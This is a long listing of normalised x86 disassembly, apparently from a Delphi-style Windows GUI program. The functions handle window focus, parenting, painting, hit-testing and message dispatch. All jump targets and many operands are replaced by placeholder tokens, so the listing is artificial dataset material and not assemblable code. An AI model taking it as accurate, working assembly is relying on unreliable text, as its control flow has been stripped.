movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4387e8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4139f4
call sub_4387e8
inc edi
dec esi
jne r-xdata
sub_438848
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4032f4
mov ebx eax
mov eax edi
call sub_4387e8
mov eax edi
call sub_438984
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_438888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43895e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_435c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4139f4
call sub_438888
inc esi
dec ebx
jne r-xdata
sub_438984
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_438888
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4389c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4387e8
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_438984
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4067cc
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_435c5c
jmp r-xdata
sub_438a4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438aa4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_438a93
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a9a
call sub_4334b8
call sub_41f4f0
retn
sub_438ac4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412598
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_4067b4
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_435c5c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_438b7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4139f4
call sub_438ac4
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4139f4
call sub_438ac4
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_438c10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b290
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4067a0
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_438b7c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4067b4
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_435c5c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_438ca4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_435218
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_435d28
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_438c10
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4067a0
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4345d4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_438b7c
test eax eax
je r-xdata
mov eax ebx
call sub_44b71c
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_435d28
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43b290
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b290
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_435c5c
sub_438e08
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_435ebc
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_435c5c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c868
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41d4ec
call sub_41c868
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41d528
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_434630
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_438f10
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_431970
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_435c5c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_438f44
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_439064
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43909c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43906b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4139f4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43909c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413a50
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4139f4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4125c0
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4139f4
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c868
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_4125c0
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c868
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4125c0
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4333cc
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_435c5c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4392cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4333cc
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_435c5c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_435c5c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4333cc
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4392cc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4139f4
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_439420
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_438f44
jmp r-xdata
mov eax ebx
call sub_437fc0
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_439572
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43b290
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_435c5c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_439420
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43b290
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_439580
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4395a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439614
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439634
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439654
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439678
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43969c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4396c0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4396e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_4279c8
mov edi eax
mov eax edi
call sub_427aa8
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41d528
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b290
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_427ba8
jmp r-xdata
sub_43976c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_436590
test bl bl
je r-xdata
mov eax edi
call sub_43b5a0
mov eax edi
call sub_43b198
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43b198
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43982c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4361ec
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43987c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b5a0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_437b50
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4032f4
sub_4398c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
